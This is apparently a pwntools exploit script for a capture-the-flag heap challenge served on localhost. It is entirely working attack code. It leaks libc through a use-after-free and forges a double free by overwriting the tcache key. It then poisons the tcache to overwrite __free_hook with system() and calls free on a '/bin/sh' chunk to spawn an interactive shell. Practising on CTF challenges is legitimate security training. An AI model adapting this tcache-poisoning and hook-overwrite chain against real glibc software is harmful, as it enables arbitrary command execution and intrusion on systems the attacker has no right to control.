from pwn import *
elf = ELF("./chall")
ld = ELF("./ld-linux-x86-64.so.2")
libc = ELF("./libc.so.6")

context.terminal = ['tmux','splitw','-h']
context.arch = 'amd64'

def conn():
    r = remote("localhost",1337)
    return r

def malloc(r,idx,sze):
    r.sendlineafter(b'>',b'1')
    r.sendlineafter(b':',str(idx).encode())
    r.sendlineafter(b':',str(sze).encode())

def free(r,idx):
    r.sendlineafter(b'>',b'2')
    r.sendlineafter(b':',str(idx).encode())

def write(r,idx,pl):
    r.sendlineafter(b'>',b'3')
    r.sendlineafter(b':',str(idx).encode())
    r.sendlineafter(b'>',pl)

def read(r,idx):
    r.sendlineafter(b'>',b'4')
    r.sendlineafter(b':',str(idx).encode())
    return r.recvline()


def main():
    r = conn()

    for i in range(9):                                         #
        malloc(r,i,0x98)                                       #
    for i in range(9):                                         #    fill up the tcache bins to get unsortedbin, after freeing unsorted bin we'll have libc leak from the fwd and bck pointers
        free(r,8-i)                                            #
    libc.address = unpack(read(r,0)[:6],'all') - 0x3ebca0      #     the libc leak we get from reading from freed bin due to uaf
    print("libc :",hex(libc.address))
    

    malloc(r,1,0x38)                                           #     allocating a tcache with size 0x40
    free(r,1)                                                                
    pl = p64(libc.sym.__free_hook) + p64(0)                    
    write(r,1,pl)                                              #     overwriting the key part so we can do double free
    free(r,1)                                                 
    write(r,1,pl)                                              #     overwriting the next pointer __free_hook()  
    malloc(r,10,0x38)                                            
    malloc(r,11,0x38)                                          #     here we get arbitrary write over __free_hook(), now if we overwrite here with a function of our choice, it will get called instead of free
    write(r,11,p64(libc.sym.system))                           #     writing system() address
    malloc(r,12,0x38)                                          
    write(r,12,b'/bin/sh')                                     #     preparing the argument to be passed to system() on being called
    free(r,12)                                                 #     becomes system("/bin/sh")
    r.interactive()


if __name__ == '__main__':
    main()
